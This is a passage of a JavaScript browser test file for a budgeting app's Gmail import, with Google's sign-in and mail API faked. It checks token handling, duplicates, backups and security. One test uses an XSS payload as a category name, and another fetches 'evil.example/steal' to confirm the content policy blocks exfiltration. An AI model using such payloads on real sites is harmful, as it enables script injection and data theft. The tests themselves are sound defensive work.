/* Gmail → review inbox, end to end, with Google faked at the network layer.
   What must hold: nothing reaches the budget until it is added by hand; the
   sign-in token is never written to storage and never left in the address;
   a sign-in that is not the answer to our own request is ignored; the same
   email is never offered twice; and Gmail settings stay on the phone (not in
   backups). The emails below are synthetic. */
"use strict";
const { boot, baseState, expense, norm } = require("../harness");

const NOW = "2026-10-15T12:00:00";
const CLIENT = "1234567890-abcdefg.apps.googleusercontent.com";
const TOKEN = "ya29.FAKE-TOKEN-should-never-be-stored";
const b64 = s => Buffer.from(s, "utf8").toString("base64url");
const msg = (id, from, subject, html, date) => ({
  id, threadId: id, internalDate: String(Date.parse(date || "2026-10-14T10:00:00Z")),
  payload: { mimeType: "text/html", headers: [{ name: "From", value: from }, { name: "Subject", value: subject }],
             body: { data: b64(html) } }
});
const MAILS = {
  g1: msg("g1", "Glovo <no-reply@glovoapp.com>", "Votre commande Glovo",
    "<html><body><table><tr><td>Sous-total</td><td>85,00 MAD</td></tr><tr><td>Frais de livraison</td><td>9,00 MAD</td></tr>" +
    "<tr><td><b>Total</b></td><td><b>94,00 MAD</b></td></tr></table></body></html>"),
  c1: msg("c1", "CIH Bank <alertes@cihbank.ma>", "Paiement par carte",
    "<p>Paiement par carte ****4521 d'un montant de 250,00 MAD chez MARJANE FES le 13/10/2026.</p><p>Solde disponible : 3 480,00 MAD</p>"),
  o1: msg("o1", "Google <no-reply@accounts.google.com>", "Code de vérification",
    "<p>Votre code de vérification est 482913. Ne le partagez avec personne.</p>")
};

async function fakeGoogle(app, opts) {
  opts = opts || {};
  const calls = { list: 0, get: 0, auth: [], authHeaders: [], urls: [] };
  await app.page.route("https://gmail.googleapis.com/**", async route => {
    const url = route.request().url();
    calls.urls.push(url);
    calls.authHeaders.push(route.request().headers()["authorization"] || "");
    if (opts.status) return route.fulfill({ status: opts.status, contentType: "application/json",
      body: JSON.stringify({ error: { code: opts.status, message: "Request had invalid authentication credentials.", errors: [{ reason: "authError" }] } }) });
    if (/\/users\/me\/profile/.test(url)) {
      calls.profile = (calls.profile || 0) + 1;
      return route.fulfill({ contentType: "application/json", body: JSON.stringify({ emailAddress: "me@gmail.com" }) });
    }
    if (/\/messages\?/.test(url)) {
      calls.list++;
      const ids = opts.ids || Object.keys(MAILS);
      return route.fulfill({ contentType: "application/json", body: JSON.stringify({ messages: ids.map(id => ({ id, threadId: id })) }) });
    }
    const id = url.split("/messages/")[1].split("?")[0];
    calls.get++;
    return route.fulfill({ contentType: "application/json", body: JSON.stringify(MAILS[id]) });
  });
  await app.page.route("https://accounts.google.com/**", route => { calls.auth.push(route.request().url()); return route.fulfill({ body: "<p>google</p>" }); });
  return calls;
}
/* coming back from Google: our saved state + a token in the address */
async function returnFromGoogle(app, state, extra) {
  const url = app.page.url().split("#")[0];
  await app.page.evaluate(s => localStorage.setItem("weekend-wallet-gmail-oauth", JSON.stringify({ state: s, at: Date.now() })), state);
  const hash = "#access_token=" + encodeURIComponent(TOKEN) + "&token_type=Bearer&expires_in=3599" +
    "&scope=" + encodeURIComponent("https://www.googleapis.com/auth/gmail.readonly") + "&state=" + (extra && extra.state || state);
  /* a hash-only change would not reload the page; Google's redirect does */
  await app.page.goto("about:blank");
  await app.page.goto(url + hash);
  await app.page.waitForTimeout(900);
}
const connected = extra => baseState(Object.assign({ salary: 9000, payday: 1, gmail: { clientId: CLIENT, lastSec: 0 } }, extra || {}));
const allStorage = p => p.evaluate(() => { const o = []; for (let i = 0; i < localStorage.length; i++) o.push(localStorage.getItem(localStorage.key(i))); return o.join("\n"); });

exports.name = "inbox · Gmail transactions wait for review";
exports.run = async function (t, env) {
  const browser = await env.getBrowser();

  /* ---- setup in Settings, and the hop to Google ---- */
  {
    const app = await boot(browser, baseState({ salary: 9000 }), { now: NOW });
    const calls = await fakeGoogle(app);
    await app.tab("settings");
    t.has("Settings explains the setup", norm(await app.shellText()), "Authorized redirect URI");
    await app.page.fill("#s-gmail-client", "not-a-client-id");
    await app.page.click("#s-gmail-save");
    await app.page.waitForTimeout(250);
    t.has("a wrong Client ID is refused", await app.toast(), "doesn’t look like a Client ID");
    await app.page.fill("#s-gmail-client", CLIENT);
    await app.page.click("#s-gmail-save");
    await app.page.waitForTimeout(800);
    t.eq("and the first save connects: one trip to Google", calls.auth.length, 1);
    const authUrl = calls.auth[0];
    await app.page.goBack();                  /* back from (fake) Google to read our storage */
    await app.page.waitForTimeout(500);
    t.eq("a real-looking one is saved", (await app.stored()).gmail.clientId, CLIENT);
    const u = new URL(authUrl || "https://x/");
    t.eq("read-only Gmail access only", u.searchParams.get("scope"), "https://www.googleapis.com/auth/gmail.readonly");
    t.eq("with our Client ID", u.searchParams.get("client_id"), CLIENT);
    t.ok("and a random state to check the answer against", (u.searchParams.get("state") || "").length >= 32);
    await app.close();
  }

  /* ---- back from Google: check, inbox, add, no duplicates ---- */
  {
    const app = await boot(browser, connected(), { now: NOW });
    const calls = await fakeGoogle(app);
    await returnFromGoogle(app, "s".repeat(40));
    t.no("the token is wiped from the address", /access_token/.test(app.page.url()), app.page.url());
    t.eq("Gmail was searched once", calls.list, 1);
    t.ok("with the token only in the Authorization header", calls.authHeaders.every(h => h === "Bearer " + TOKEN) && calls.urls.every(u => u.indexOf(TOKEN) < 0));
    t.no("the token is never written to storage", (await allStorage(app.page)).indexOf(TOKEN) >= 0);
    let s = await app.stored();
    t.eq("every email fetched is remembered", Object.keys(s.mailSeen).sort(), ["c1", "g1", "o1"]);
    t.eq("two of them were transactions", s.inbox.map(x => x.id).sort(), ["c1", "g1"]);
    t.eq("nothing counts yet", s.expenses.length, 0);
    const glovo = s.inbox.find(x => x.id === "g1"), cih = s.inbox.find(x => x.id === "c1");
    t.eq("Glovo: the total, not the subtotal", glovo && glovo.amount, 94);
    t.eq("CIH: the payment, not the balance", cih && cih.amount, 250);
    t.no("no email text is kept", JSON.stringify(s.inbox).indexOf("Solde") >= 0);
    const sheet = norm(await app.page.evaluate(() => document.querySelector("#sheet").innerText));
    t.has("the inbox opens by itself", sheet, "From Gmail");

    await app.page.click('[data-inbox-edit="g1"]');
    await app.page.waitForTimeout(350);
    t.eq("Add opens the usual form, filled in", await app.page.inputValue("#f-amount"), "94");
    await app.page.click("#f-save");
    await app.page.waitForTimeout(450);
    s = await app.stored();
    const e = s.expenses.find(x => x.mailId === "g1");
    t.ok("the expense remembers its email", e && e.amount === 94 && e.cat === "food");
    t.eq("and the inbox entry is settled in the same save", s.inbox.find(x => x.id === "g1").status, "added");
    t.has("the next one is offered", norm(await app.toast()), "1 more to review");
    t.ok("back in the inbox, not on Home", await app.page.evaluate(() => !!document.querySelector("#inbox-list")));

    await app.page.reload();
    await app.page.waitForTimeout(500);
    t.ok("the mail link survives a relaunch", (await app.stored()).expenses.some(x => x.mailId === "g1"));
    t.has("Home shows what is waiting", norm(await app.shellText()), "1 transaction from Gmail to review");
    t.no("and the token did not survive it", (await allStorage(app.page)).indexOf(TOKEN) >= 0);

    await app.page.click("#h-inbox");
    await app.page.waitForTimeout(350);
    await app.page.click('[data-inbox-skip="c1"]');
    await app.page.waitForTimeout(350);
    t.eq("Skip settles it without spending anything", (await app.stored()).inbox.find(x => x.id === "c1").status, "dismissed");
    t.eq("still one expense", (await app.stored()).expenses.length, 1);

    /* a second check sees the same three emails: nothing is offered again */
    await returnFromGoogle(app, "t".repeat(40));
    s = await app.stored();
    t.eq("the same emails are never offered twice", s.inbox.filter(x => x.status === "new").length, 0);
    t.eq("and none is downloaded twice", calls.get, 3);
    t.no("no page errors", app.errors.length, app.errors.join(" | "));
    await app.close();
  }

  /* ---- a sign-in we did not ask for is ignored ---- */
  {
    const app = await boot(browser, connected(), { now: NOW });
    const calls = await fakeGoogle(app);
    await returnFromGoogle(app, "a".repeat(40), { state: "b".repeat(40) });
    t.eq("a mismatched state: Gmail is not touched", calls.list, 0);
    t.has("and it says why", await app.toast(), "didn’t come from this app");
    await app.close();
  }

  /* ---- an expired sign-in ---- */
  {
    const app = await boot(browser, connected(), { now: NOW });
    await fakeGoogle(app, { status: 401 });
    await returnFromGoogle(app, "c".repeat(40));
    t.has("a 401 asks to sign in again", await app.toast(), "sign-in expired");
    t.eq("and changes nothing", ((await app.stored()).inbox || []).length, 0);
    await app.close();
  }

  /* ---- backups: no Gmail settings or inbox in the file, and a restore keeps this phone's ---- */
  {
    const app = await boot(browser, connected({ inbox: [{ id: "x1", amount: 10, date: "2026-10-10", merchant: "Shop", status: "new" }],
      expenses: [expense({ id: "m1", amount: 94, date: "2026-10-14", cat: "food", mailId: "g1" })] }), { now: NOW });
    app.page.on("dialog", d => d.accept());
    await app.tab("settings");
    const [dl] = await Promise.all([app.page.waitForEvent("download"), app.page.click("#s-export")]);
    const file = require("fs").readFileSync(await dl.path(), "utf8");
    t.no("the backup has no Gmail settings", /googleusercontent|"gmail"/.test(file));
    t.no("and no inbox", /"inbox"/.test(file));
    t.has("but expenses keep their mail link", file, '"mailId": "g1"');
    await app.page.setInputFiles("#s-import-file", { name: "b.json", mimeType: "application/json",
      buffer: Buffer.from(JSON.stringify(baseState({ salary: 1, expenses: [] }))) });
    await app.page.waitForTimeout(600);
    const s = await app.stored();
    t.eq("a restore keeps this phone's Gmail link", s.gmail.clientId, CLIENT);
    t.eq("and its inbox", s.inbox.length, 1);
    await app.close();
  }

  /* ---- QA round: a failed download must not hide an email for good ---- */
  {
    const app = await boot(browser, connected({ gmail: { clientId: CLIENT, lastSec: 1790000000 } }), { now: NOW });
    const calls = await fakeGoogle(app);
    await app.page.route("https://gmail.googleapis.com/**/messages/c1?**", r => r.fulfill({ status: 500, body: "{}" }));
    await returnFromGoogle(app, "d".repeat(40));
    const s = await app.stored();
    t.eq("the checkpoint stays put when a download failed", s.gmail.lastSec, 1790000000);
    t.no("the failed email is not marked as seen", !!s.mailSeen.c1);
    t.has("and it says so where it stays visible", norm(await app.page.evaluate(() => document.querySelector("#inbox-error").innerText)), "couldn’t be downloaded");
    t.ok("the others still arrive", s.inbox.some(x => x.id === "g1"));
    await app.close();
  }

  /* ---- QA round: one purchase, two emails ---- */
  {
    const twins = Object.assign({}, MAILS, {
      c2: msg("c2", "CIH Bank <alertes@cihbank.ma>", "Paiement par carte",
        "<p>Paiement par carte ****4521 d'un montant de 94,00 MAD chez GLOVO le 14/10/2026.</p>")
    });
    const app = await boot(browser, connected(), { now: NOW });
    const keep = Object.assign({}, MAILS); Object.assign(MAILS, twins);
    await fakeGoogle(app, { ids: ["g1", "c2"] });
    await returnFromGoogle(app, "e".repeat(40));
    Object.keys(MAILS).forEach(k => delete MAILS[k]); Object.assign(MAILS, keep);
    const txt = norm(await app.page.evaluate(() => document.querySelector("#sheet").innerText));
    t.has("the bank alert and the receipt are flagged as one purchase", txt, "Possibly the same purchase");
    t.has("with what to do", txt, "keep only one");
    await app.close();
  }

  /* ---- QA round: a EUR receipt is not saved as dirhams ---- */
  {
    const app = await boot(browser, connected({ inbox: [{ id: "n1", amount: 13.49, currency: "EUR", date: "2026-10-12",
      merchant: "Netflix", sender: "Netflix", status: "new", kind: "debit", cat: "bills", confidence: 0.9 }] }), { now: NOW });
    await app.page.click("#h-inbox");
    await app.page.waitForTimeout(300);
    await app.page.click('[data-inbox-add="n1"]');
    await app.page.waitForTimeout(350);
    t.eq("the amount is left for you to enter in MAD", await app.page.inputValue("#f-amount"), "");
    t.has("the original is kept in the note", await app.page.inputValue("#f-note"), "Netflix (EUR 13.49)");
    t.has("the form says where it came from", norm(await app.page.evaluate(() => document.querySelector("#sheet").innerText)), "From Gmail · Netflix");
    await app.close();
  }

  /* ---- QA round: restoring an older backup re-offers what it no longer holds ---- */
  {
    const app = await boot(browser, connected({
      inbox: [{ id: "g1", amount: 94, date: "2026-10-14", merchant: "Glovo", status: "added", expenseId: "m1", kind: "debit", confidence: 0.9 },
              { id: "c1", amount: 250, date: "2026-10-13", merchant: "Marjane", status: "new", kind: "debit", confidence: 0.85 }],
      expenses: [expense({ id: "m1", amount: 94, date: "2026-10-14", cat: "food", mailId: "g1" })] }), { now: NOW });
    app.page.on("dialog", d => d.accept());
    await app.tab("settings");
    const older = baseState({ salary: 1, expenses: [expense({ id: "z9", amount: 250, date: "2026-10-13", cat: "food", mailId: "c1" })] });
    await app.page.setInputFiles("#s-import-file", { name: "b.json", mimeType: "application/json", buffer: Buffer.from(JSON.stringify(older)) });
    await app.page.waitForTimeout(600);
    const s = await app.stored();
    t.eq("an email whose expense the backup lacks is offered again", s.inbox.find(x => x.id === "g1").status, "new");
    t.eq("an email the backup already holds is not", s.inbox.find(x => x.id === "c1").status, "added");
    await app.close();
  }

  /* ---- QA round: offline, and disconnecting ---- */
  {
    const app = await boot(browser, connected({ inbox: [{ id: "x1", amount: 10, date: "2026-10-10", merchant: "Shop", status: "new", kind: "debit", confidence: 0.9 }] }), { now: NOW });
    const calls = await fakeGoogle(app);
    app.page.on("dialog", d => d.accept());
    await app.ctx.setOffline(true);
    await app.page.click("#h-inbox");
    await app.page.waitForTimeout(300);
    await app.page.click("#inbox-check");
    await app.page.waitForTimeout(400);
    t.eq("offline: no trip to Google that would strand you", calls.auth.length, 0);
    t.has("it says why instead", norm(await app.page.evaluate(() => document.querySelector("#inbox-error").innerText)), "offline");
    await app.ctx.setOffline(false);
    await app.page.evaluate(() => document.querySelector(".sheet-x").click());
    await app.page.waitForTimeout(400);
    await app.tab("settings");
    await app.page.click("#s-gmail-forget");
    await app.page.waitForTimeout(400);
    const s = await app.stored();
    t.eq("Disconnect forgets the Client ID", s.gmail.clientId, "");
    t.eq("and what was waiting in the inbox", s.inbox.length, 0);
    await app.tab("home");
    t.no("so Home stops asking", /from Gmail to review/.test(await app.shellText()));
    await app.close();
  }

  /* ---- security round ---- */
  {
    /* an email that breaks the parser is still written down as seen, so it
       cannot be fetched -- and break things -- on every check */
    const app = await boot(browser, connected(), { now: NOW });
    await fakeGoogle(app);
    await app.page.addInitScript(() => {
      const iv = setInterval(() => {
        if (window.MailParse) { const real = window.MailParse.parseMail;
          window.MailParse.parseMail = m => {
            if (m.id === "o1") {
              /* what is already ON DISK when the parser starts -- a hang here
                 must not have lost the record that this email was seen */
              const disk = JSON.parse(localStorage.getItem("weekend-wallet-v1") || "{}");
              window.__seenOnDisk = !!(disk.mailSeen && disk.mailSeen.o1);
              throw new Error("boom");
            }
            return real(m); }; clearInterval(iv); }
      }, 1);
    });
    await returnFromGoogle(app, "f".repeat(40));
    const s = await app.stored();
    t.ok("an email the parser chokes on is still marked seen", !!s.mailSeen.o1);
    t.ok("and that was saved BEFORE parsing began", await app.page.evaluate(() => window.__seenOnDisk === true));
    t.ok("and the rest still arrive", s.inbox.some(x => x.id === "g1"));
    t.ok("senders are kept by name, never by address", s.inbox.every(x => !/@/.test(x.sender)));
    await app.close();
  }
  {
    /* the Gmail code failed to load (offline first launch): the token must
       still be wiped from the address */
    const app = await boot(browser, connected(), { now: NOW });
    await app.page.route("**/gmail.js*", r => r.abort());
    await returnFromGoogle(app, "g".repeat(40));
    t.no("a token in the address is wiped even without the Gmail code", /access_token/.test(app.page.url()), app.page.url());
    await app.close();
  }

  /* ---- round 1: checking by itself on open (opt-in, throttled) ---- */
  const autoState = extra => connected(Object.assign({ gmail: Object.assign({ clientId: CLIENT, lastSec: 0, auto: 1, autoTs: 0 }, extra || {}) }));
  {
    const app = await boot(browser, connected(), { now: NOW });
    const calls = await fakeGoogle(app);
    await app.page.reload(); await app.page.waitForTimeout(2600);
    t.eq("switched off (the default): opening the app never leaves for Google", calls.auth.length, 0);
    await app.close();
  }
  {
    const app = await boot(browser, autoState(), { now: NOW });
    const calls = await fakeGoogle(app);
    await app.page.reload(); await app.page.waitForTimeout(2600);
    t.eq("switched on: one silent trip to Google on opening", calls.auth.length, 1);
    t.eq("asking Google to show nothing", new URL(calls.auth[0] || "https://x/").searchParams.get("prompt"), "none");
    await app.page.goBack(); await app.page.waitForTimeout(2600);
    t.ok("the try is written down before leaving", (await app.stored()).gmail.autoTs > 0);
    t.eq("so coming straight back does not go again", calls.auth.length, 1);
    await app.close();
  }
  {
    const app = await boot(browser, autoState(), { now: NOW });
    const calls = await fakeGoogle(app);
    await app.ctx.setOffline(true);
    await app.page.evaluate(() => window.dispatchEvent(new Event("offline")));
    await app.page.reload().catch(() => {}); await app.page.waitForTimeout(2600);
    t.eq("offline: no trip to Google", calls.auth.length, 0);
    await app.ctx.setOffline(false);
    await app.close();
  }
  {
    /* Google could not do it silently: no alarm, a note in the inbox */
    const app = await boot(browser, autoState({ autoTs: Date.parse(NOW) }), { now: NOW });
    const calls = await fakeGoogle(app);
    const url = app.page.url().split("#")[0];
    await app.page.evaluate(() => localStorage.setItem("weekend-wallet-gmail-oauth", JSON.stringify({ state: "q".repeat(40), at: Date.now(), silent: 1 })));
    await app.page.goto("about:blank");
    await app.page.goto(url + "#error=interaction_required&state=" + "q".repeat(40));
    await app.page.waitForTimeout(1500);
    t.no("a silent miss opens nothing by itself", await app.page.evaluate(() => document.querySelector("#sheet").classList.contains("show")));
    t.no("and the token address is gone", /error=/.test(app.page.url()));
    t.eq("Gmail is not touched", calls.list, 0);
    await app.close();
  }

  /* ---- round 1: merchant memory ---- */
  {
    const app = await boot(browser, connected({ expenses: [
      expense({ id: "h1", amount: 80, date: "2026-10-01", cat: "out", note: "Glovo" }),
      expense({ id: "h2", amount: 60, date: "2026-10-05", cat: "out", note: "glovo" }) ] }), { now: NOW });
    await fakeGoogle(app, { ids: ["g1"] });
    await returnFromGoogle(app, "m".repeat(40));
    const it = (await app.stored()).inbox.find(x => x.id === "g1");
    t.eq("two Glovos you filed as Going out beat the parser's Food", it && it.cat, "out");
    t.has("and the inbox says it is your usual", norm(await app.page.evaluate(() => document.querySelector("#sheet").innerText)).toLowerCase(), "going out your usual");
    await app.close();
  }
  {
    const app = await boot(browser, connected({ expenses: [ expense({ id: "h1", amount: 80, date: "2026-10-01", cat: "out", note: "Glovo" }) ] }), { now: NOW });
    await fakeGoogle(app, { ids: ["g1"] });
    await returnFromGoogle(app, "n".repeat(40));
    t.eq("one choice is not yet a habit: the parser's category stands", (await app.stored()).inbox.find(x => x.id === "g1").cat, "food");
    await app.close();
  }

  /* ---- loop 1: the round-1 attacker's findings ---- */
  const silentReturn = async (app, st, hashTail) => {
    const url = app.page.url().split("#")[0];
    await app.page.evaluate(s => localStorage.setItem("weekend-wallet-gmail-oauth", JSON.stringify({ state: s, at: Date.now(), silent: 1 })), st);
    await app.page.goto("about:blank");
    await app.page.goto(url + "#" + hashTail + "&state=" + st);
  };
  {
    /* a background check finishing late must not replace the form you are typing in */
    const app = await boot(browser, autoState({ autoTs: Date.parse(NOW) }), { now: NOW });
    await app.page.route("https://gmail.googleapis.com/**", async route => {
      await new Promise(r => setTimeout(r, 1500));
      const url = route.request().url();
      if (/\/messages\?/.test(url)) return route.fulfill({ contentType: "application/json", body: JSON.stringify({ messages: [{ id: "g1", threadId: "g1" }] }) });
      return route.fulfill({ contentType: "application/json", body: JSON.stringify(MAILS.g1) });
    });
    await silentReturn(app, "s".repeat(40), "access_token=" + encodeURIComponent(TOKEN) + "&token_type=Bearer&expires_in=3599&scope=" + encodeURIComponent("https://www.googleapis.com/auth/gmail.readonly"));
    await app.page.waitForTimeout(300);
    await app.page.click("#open-add"); await app.page.waitForTimeout(250);
    await app.page.click("#qa-expense"); await app.page.waitForTimeout(250);
    await app.page.fill("#f-amount", "123");
    await app.page.waitForTimeout(3500);
    t.eq("a late background check leaves your half-typed expense alone", await app.page.inputValue("#f-amount").catch(() => "GONE"), "123");
    t.ok("but what it found is waiting", (await app.stored()).inbox.some(x => x.id === "g1"));
    await app.close();
  }
  {
    const app = await boot(browser, autoState(), { now: NOW });
    const calls = await fakeGoogle(app);
    await app.tab("settings");
    await app.page.focus("#s-gmail-client");
    await app.page.evaluate(() => document.dispatchEvent(new Event("visibilitychange")));
    await app.page.waitForTimeout(2500);
    t.eq("never leaves for Google from a screen where you may be typing", calls.auth.length, 0);
    await app.close();
  }
  {
    const app = await boot(browser, autoState({ autoTs: Date.parse(NOW) + 86400000 }), { now: NOW });
    const calls = await fakeGoogle(app);
    await app.page.reload(); await app.page.waitForTimeout(2600);
    t.eq("a try stamped in the future (clock moved) does not block it forever", calls.auth.length, 1);
    await app.close();
  }
  {
    const app = await boot(browser, autoState({ autoTs: Date.parse(NOW) }), { now: NOW });
    await fakeGoogle(app);
    await silentReturn(app, "u".repeat(40), "error=access_denied");
    await app.page.waitForTimeout(1200);
    t.no("any silent miss stays quiet (no popup)", await app.page.evaluate(() => document.querySelector("#sheet").classList.contains("show")));
    let s = await app.stored();
    t.eq("it is counted, to back off", s.gmail.autoFails, 1);
    await app.page.reload(); await app.page.waitForTimeout(600);
    t.has("and remembered after a relaunch, on Home", norm(await app.shellText()), "automatic check didn’t work");
    await app.close();
  }
  {
    const app = await boot(browser, autoState({ autoTs: Date.parse(NOW) - 7 * 3600000, autoFails: 1 }), { now: NOW });
    const calls = await fakeGoogle(app);
    await app.page.reload(); await app.page.waitForTimeout(2600);
    t.eq("after a miss it waits 12 hours, not 6", calls.auth.length, 0);
    await app.close();
  }
  {
    const app = await boot(browser, connected({ expenses: [
      expense({ id: "h1", amount: 140, date: "2026-10-01", cat: "out", note: "Glovo (EUR 13.49)" }),
      expense({ id: "h2", amount: 60, date: "2026-10-05", cat: "out", note: "GLOVO" }) ] }), { now: NOW });
    await fakeGoogle(app, { ids: ["g1"] });
    await returnFromGoogle(app, "v".repeat(40));
    t.eq("a note with a foreign-amount suffix still teaches the shop", (await app.stored()).inbox.find(x => x.id === "g1").cat, "out");
    await app.close();
  }
  {
    const app = await boot(browser, connected({ inbox: [{ id: "d1", amount: 30, currency: "MAD", date: "2026-10-12", merchant: "Shop",
      status: "new", kind: "debit", cat: "ugone", learned: 1, confidence: 0.9 }] }), { now: NOW });
    await app.page.click("#h-inbox"); await app.page.waitForTimeout(300);
    t.has("a category that no longer exists is not offered", norm(await app.page.evaluate(() => document.querySelector("#sheet").innerText)), "no category yet");
    await app.page.click('[data-inbox-add="d1"]'); await app.page.waitForTimeout(300);
    await app.page.click("#f-save"); await app.page.waitForTimeout(450);
    t.ok("and never written", (await app.stored()).expenses.every(e => e.cat !== "ugone"));
    await app.close();
  }
  {
    /* custom category names are user (or backup-file) text: never markup */
    const evil = "<img src=x onerror=window.__pwn=1>";
    const app = await boot(browser, baseState({ salary: 9000, customCats: [{ id: "uevil01", name: evil, color: "#d6336c", emoji: "", hidden: 0 }],
      expenses: [expense({ id: "x1", amount: 10, date: "2026-10-14", cat: "uevil01", note: "t" })] }), { now: NOW });
    await app.tab("history");
    await app.page.click("#open-add"); await app.page.waitForTimeout(250);
    await app.page.click("#qa-expense"); await app.page.waitForTimeout(400);
    t.no("a custom category name never runs as code", await app.page.evaluate(() => !!window.__pwn));
    t.has("it shows as plain text", await app.page.evaluate(() => document.querySelector("#sheet").innerText), "<img src=x");
    await app.close();
  }

  /* ---- loop 1 UX: one tap, with Undo; plain-language errors; the address for login_hint ---- */
  {
    const app = await boot(browser, connected({ inbox: [
      { id: "k1", amount: 32, currency: "MAD", date: "2026-10-13", merchant: "Careem", sender: "Careem", status: "new", kind: "debit", cat: "transport", confidence: 0.9 },
      { id: "k2", amount: 18, currency: "MAD", date: "2026-10-12", merchant: "Careem", sender: "Careem", status: "new", kind: "debit", cat: "transport", confidence: 0.9 } ] }), { now: NOW });
    await app.page.click("#h-inbox"); await app.page.waitForTimeout(300);
    t.has("the button says what it will do", await app.page.getAttribute('[data-inbox-add="k1"]', "aria-label"), "Add Careem MAD 32 as Transport");
    await app.page.click('[data-inbox-add="k1"]'); await app.page.waitForTimeout(450);
    let s = await app.stored();
    t.ok("Add saves in one tap", s.expenses.some(e => e.mailId === "k1" && e.amount === 32 && e.cat === "transport"));
    t.ok("and stays in the inbox for the next one", await app.page.evaluate(() => !!document.querySelector('[data-inbox-add="k2"]')));
    t.has("with an Undo", norm(await app.toast()), "Undo");
    await app.page.click("#toast button"); await app.page.waitForTimeout(450);
    s = await app.stored();
    t.ok("Undo takes the expense back out", !s.expenses.some(e => e.mailId === "k1"));
    t.eq("and puts the email back in the inbox", s.inbox.find(x => x.id === "k1").status, "new");
    await app.close();
  }
  {
    /* more than you have left: one tap must not skip the funding question */
    const app = await boot(browser, connected({ restAmount: 20, restFrom: "2026-10-14", restTs: Date.parse("2026-10-14T08:00:00"),
      inbox: [{ id: "big", amount: 900, currency: "MAD", date: "2026-10-14", merchant: "Jumia", sender: "Jumia", status: "new", kind: "debit", cat: "shop", confidence: 0.9 }] }), { now: NOW });
    await app.page.click("#h-inbox"); await app.page.waitForTimeout(300);
    await app.page.click('[data-inbox-add="big"]'); await app.page.waitForTimeout(450);
    t.ok("an expense that needs funding opens the form instead", await app.page.evaluate(() => !!document.querySelector("#f-save")));
    t.eq("nothing saved behind your back", (await app.stored()).expenses.length, 0);
    await app.close();
  }
  {
    const app = await boot(browser, connected(), { now: NOW });
    await app.page.route("https://gmail.googleapis.com/**", r => r.fulfill({ status: 403, contentType: "application/json",
      body: JSON.stringify({ error: { code: 403, message: "Gmail API has not been used in project 123456789 before or it is disabled. Enable it by visiting https://console.developers.google.com/apis/api/gmail.googleapis.com/overview?project=123456789 then retry.", errors: [{ reason: "accessNotConfigured" }] } }) }));
    await app.page.route("https://accounts.google.com/**", r => r.fulfill({ body: "x" }));
    await returnFromGoogle(app, "w".repeat(40));
    const box = await app.page.evaluate(() => document.querySelector("#inbox-error").innerHTML);
    t.has("the API-off error is said plainly", box, "switched off in your Google Cloud project");
    t.has("with a link straight to the switch for that project", box, "apis/library/gmail.googleapis.com?project=123456789");
    await app.close();
  }
  {
    const app = await boot(browser, connected(), { now: NOW });
    const calls = await fakeGoogle(app, { ids: ["g1"] });
    await app.page.route("https://gmail.googleapis.com/gmail/v1/users/me/profile", r => r.fulfill({ contentType: "application/json", body: JSON.stringify({ emailAddress: "badr@gmail.com" }) }));
    await returnFromGoogle(app, "x".repeat(40));
    await app.page.waitForTimeout(400);
    t.eq("the address is remembered once", (await app.stored()).gmail.email, "badr@gmail.com");
    await app.page.reload(); await app.page.waitForTimeout(500);   /* a relaunch: the hour-long sign-in is gone */
    await app.tab("settings");
    await app.page.click("#s-gmail-check"); await app.page.waitForTimeout(600);
    t.eq("and handed back to Google, so it can skip the account chooser", new URL(calls.auth[calls.auth.length - 1] || "https://x/").searchParams.get("login_hint"), "badr@gmail.com");
    await app.close();
  }

  /* ---- loop 1 security: what a hostile script could do once loaded ---- */
  {
    const app = await boot(browser, connected(), { now: NOW });
    const r = await app.page.evaluate(async () => {
      /* the browser's own policy must be what stops it -- not a dead server */
      let blocked = false;
      document.addEventListener("securitypolicyviolation", e => { if (/evil\.example/.test(e.blockedURI)) blocked = true; });
      try { await fetch("https://evil.example/steal?x=1"); } catch (e) {}
      await new Promise(r => setTimeout(r, 100));
      const before = window.GmailSync.fetchNew;
      try { window.GmailSync.fetchNew = function(){}; } catch (e) {}
      try { window.GmailSync = { fetchNew: function(){} }; } catch (e) {}
      return { blocked, locked: window.GmailSync.fetchNew === before };
    });
    t.ok("the page cannot send data to a server it doesn't use", r.blocked);
    t.ok("and no script can swap out the Gmail code that handles the token", r.locked);
    const html = require("fs").readFileSync(require("path").join(require("../harness").APP_DIR, "index.html"), "utf8");
    t.ok("the OCR script is one exact version", /tesseract\.js@5\.1\.1\/dist\/tesseract\.min\.js/.test(html) && !/tesseract\.js@5\/dist/.test(html));
    t.ok("and refused unless its bytes match the pinned hash", /s\.integrity = "sha384-[A-Za-z0-9+\/=]{64}"/.test(html) && /s\.crossOrigin = "anonymous"/.test(html));
    await app.close();
  }

  /* ---- loop 1 QA: duplicates against what was saved; Skip undo; double taps; memory; senders ---- */
  {
    const app = await boot(browser, connected({
      expenses: [expense({ id: "ed", amount: 96, date: "2026-10-14", cat: "food", note: "Glovo", mailId: "g1" })],
      inbox: [ { id: "g1", amount: 94, currency: "MAD", date: "2026-10-14", merchant: "Glovo", sender: "Glovo", status: "added", expenseId: "ed", kind: "debit", cat: "food", confidence: 0.9 },
               { id: "c9", amount: 96, currency: "MAD", date: "2026-10-14", merchant: "Glovo", sender: "CIH Bank", status: "new", kind: "debit", cat: "food", confidence: 0.85 },
               { id: "c8", amount: 94, currency: "MAD", date: "2026-10-14", merchant: "Glovo", sender: "CIH Bank", status: "new", kind: "debit", cat: "food", confidence: 0.85 } ] }), { now: NOW });
    await app.page.click("#h-inbox"); await app.page.waitForTimeout(300);
    const rows = await app.page.evaluate(() => [...document.querySelectorAll(".inbox-item")].map(r => r.innerText));
    t.has("an email you added then edited to 96 is matched at 96", rows.find(r => /96/.test(r)) || "", "already added");
    t.no("and no longer at the 94 the email said", /already added/.test(rows.find(r => /94/.test(r) && !/96/.test(r)) || ""));
    await app.close();
  }
  {
    const app = await boot(browser, connected({ inbox: [
      { id: "s1", amount: 12, currency: "MAD", date: "2026-10-13", merchant: "Foyer", sender: "Foyer", status: "new", kind: "debit", cat: "drinks", confidence: 0.9 } ] }), { now: NOW });
    await app.page.click("#h-inbox"); await app.page.waitForTimeout(300);
    await app.page.click('[data-inbox-skip="s1"]'); await app.page.waitForTimeout(350);
    t.eq("Skip settles it", (await app.stored()).inbox[0].status, "dismissed");
    await app.page.click("#toast button"); await app.page.waitForTimeout(350);
    t.eq("and Skip can be undone", (await app.stored()).inbox[0].status, "new");
    await app.close();
  }
  {
    const app = await boot(browser, connected({ inbox: [
      { id: "a1", amount: 10, currency: "MAD", date: "2026-10-13", merchant: "Shop A", sender: "A", status: "new", kind: "debit", cat: "food", confidence: 0.9 },
